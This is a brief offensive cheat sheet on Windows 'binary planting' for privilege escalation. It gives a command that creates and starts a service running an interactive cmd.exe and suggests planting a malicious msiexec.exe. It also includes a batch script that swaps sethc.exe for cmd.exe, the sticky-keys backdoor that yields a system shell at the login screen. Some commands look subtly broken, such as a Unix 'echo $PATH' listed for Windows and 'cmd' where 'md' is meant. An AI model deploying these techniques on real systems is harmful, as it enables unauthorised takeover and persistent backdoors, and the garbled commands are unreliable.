# Windows Binary Planting

Binary Planting is essentially putting binary is a specific place, be it moved, copied or uploaded to create the desired effect. In this section we'll be going over the use of binary planting to escalate privileges.

| Command | Description / Importance |
| ------- | ------------------------ |
| `%SystemRoot%\System32\wbem\mof\` | Taken from Stuxnet: http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf Look for Print spooler vulnerability. |
| `echo $PATH` | Check the $PATH environmental variable. Some directories may be writable. See: https://www.htbridge.com/advisory/HTB23108 |
| `msiexec.exe` | Idea taken from here: http://goo.gl/E3LTa - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path you get code execution. |
| `sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys` | Create malicious services. |
|<code>Replacing file as: sethc.exe<br>@echo off <br>c: > nul\\cd\ > nul\\cd %SYSTEMROOT%\System32\ > nul <br>if exist %SYSTEMROOT%\System32\cmdsys\ rd /q %SYSTEMROOT%\System32\cmdsys\ > nul <br>cmd %SYSTEMROOT%\System32\cmdsys\ > nul <br>copy /y c:\windows\system32\cmd.exe c:\windows\system32\cmdsys\cmd.bkp /y > nul <br>copy /y c:\windows\system32\sethc.exe c:\windows\system32\cmdsys\sethc.bkp /y > nul <br>copy /y c:\windows\system32\cmd.exe c:\windows\system32\cmdsys\sethc.exe /y > nul <br>copy /y c:\windows\system32\cmdsys\sethc.exe c:\windows\system32\sethc.exe /y > nul<br>exit</code> | By doing this, you just have to press the sticky key activation key. From Wikipedia.org: To enable this shortcut, the ?Shift key must be pressed 5 times in short succession. This feature can also be turned on and off via the Accessibility icon in the Windows Control Panel. To turn off once enabled, just simply press 3 or more of the Sticky Keys (Ctrl, Alt, Shift, Windows Button) at the same time. |